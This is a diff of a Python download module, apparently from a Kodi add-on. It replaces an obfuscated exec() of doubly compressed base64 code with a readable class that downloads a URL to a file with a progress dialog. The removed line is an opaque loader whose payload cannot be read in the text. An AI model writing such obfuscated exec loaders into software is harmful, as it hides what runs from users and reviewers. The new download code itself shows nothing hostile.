@@ -1,3 +1,128 @@
+# -*- coding: utf-8 -*-
+# Python 3
 
-import zlib, base64
-exec(zlib.decompress(base64.b64decode(zlib.decompress(base64.b64decode('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')))).decode('utf-8'))
+import os
+import time
+import xbmcgui
+
+from resources.lib import utils
+from resources.lib.config import cConfig
+from resources.lib.gui.gui import cGui
+from xbmc import LOGINFO as LOGNOTICE, log
+from xbmcvfs import translatePath
+from urllib.request import Request, urlopen
+
+LOGMESSAGE = cConfig().getLocalizedString(30166)
+class cDownload:
+    def __createProcessDialog(self, downloadDialogTitle):
+        if cConfig().getSetting('backgrounddownload') == 'true':
+            oDialog = xbmcgui.DialogProgressBG()
+        else:
+            oDialog = xbmcgui.DialogProgress()
+        oDialog.create(downloadDialogTitle)
+        self.__oDialog = oDialog
+
+
+    def __createDownloadFilename(self, filename):
+        filename = filename.replace(' ', '_')
+        return filename
+
+
+    def download(self, url, sTitle, showDialog=True, downloadDialogTitle=cConfig().getLocalizedString(30245)):
+        sTitle = '%s' % sTitle
+        self.__processIsCanceled = False
+        try:
+            header = dict([item.split('=') for item in (url.split('|')[1]).split('&')])
+        except Exception:
+            header = {}
+        log(LOGMESSAGE + ' -> [download]: Header for download: %s' % header, LOGNOTICE)
+        url = url.split('|')[0]
+        sTitle = self.__createTitle(url, sTitle)
+        self.__sTitle = self.__createDownloadFilename(sTitle)
+        if showDialog:
+            self.__sTitle = cGui().showKeyBoard(self.__sTitle, sHeading=cConfig().getLocalizedString(30290))
+            if self.__sTitle != False and len(self.__sTitle) > 0:
+                sPath = cConfig().getSetting('download-folder')
+                if sPath == '':
+                    dialog = xbmcgui.Dialog()
+                    sPath = dialog.browse(3, 'Downloadfolder', 'files', '')
+                if sPath != '':
+                    sDownloadPath = translatePath(sPath + '%s' % (self.__sTitle,))
+                    self.__prepareDownload(url, header, sDownloadPath, downloadDialogTitle)
+        elif self.__sTitle != False:
+            temp_dir = os.path.join(utils.profilePath)
+            if not os.path.isdir(temp_dir):
+                os.makedirs(os.path.join(temp_dir))
+            self.__prepareDownload(url, header, os.path.join(temp_dir, sTitle), downloadDialogTitle)
+            log(LOGMESSAGE + ' -> [download]: download completed', LOGNOTICE)
+
+
+    def __prepareDownload(self, url, header, sDownloadPath, downloadDialogTitle):
+        try:
+            log(LOGMESSAGE + ' -> [download]: download file: ' + str(url) + ' to ' + str(sDownloadPath), LOGNOTICE)
+            self.__createProcessDialog(downloadDialogTitle)
+            request = Request(url, headers=header)
+            self.__download(urlopen(request, timeout=240), sDownloadPath)
+        except Exception as e:
+            log(e)
+        self.__oDialog.close()
+
+
+    def __download(self, oUrlHandler, fpath):
+        headers = oUrlHandler.info()
+        iTotalSize = -1
+        if 'content-length' in headers:
+            iTotalSize = (headers['Content-Length'])
+        chunk = 4096
+        #f = open(r'%s' % fpath, 'wb')
+        import xbmcvfs
+        f = xbmcvfs.File(fpath, 'w')
+        log(LOGMESSAGE + ' -> [download]: start download', LOGNOTICE)
+        try:
+            iCount = 0
+            self._startTime = time.time()
+            while 1:
+                iCount = iCount + 1
+                data = oUrlHandler.read(chunk)
+                if not data or self.__processIsCanceled == True:
+                    break
+                f.write(data)
+                self.__stateCallBackFunction(iCount, chunk, iTotalSize)              
+            f.close()
+            
+        except:
+            log(LOGMESSAGE + '-> [download]: download failed', LOGNOTICE)     
+            f.close()
+
+
+    def __createTitle(self, sUrl, sTitle):
+        aTitle = sTitle.rsplit('.')
+        if len(aTitle) > 1:
+            return sTitle
+        aUrl = sUrl.rsplit('.')
+        if len(aUrl) > 1:
+            sSuffix = aUrl[-1]
+            sTitle = sTitle + '.' + sSuffix
+        return sTitle
+
+
+    def __stateCallBackFunction(self, iCount, iBlocksize, iTotalSize):
+        timedif = time.time() - self._startTime
+        currentLoaded = int(iCount) * iBlocksize
+        iPercent = (currentLoaded * 100 // int(iTotalSize))
+        if timedif > 0.0:
+            avgSpd = (currentLoaded // timedif // 1024.0)
+        else:
+            avgSpd = 5
+        value = self.__sTitle, str('%s/%s@%dKB/s' % (self.__formatFileSize(currentLoaded), self.__formatFileSize(iTotalSize), avgSpd))
+        self.__oDialog.update(iPercent, str(value))
+        if cConfig().getSetting('backgrounddownload') == 'false' and self.__oDialog.iscanceled():
+            self.__processIsCanceled = True
+            self.__oDialog.close()
+
+
+    def __formatFileSize(self, iBytes):
+        iBytes = int(iBytes)
+        if iBytes == 0:
+            return '%.*f %s' % (2, 0, 'MB')
+        return '%.*f %s' % (2, int(iBytes) // (1024 * 1024.0), 'MB')
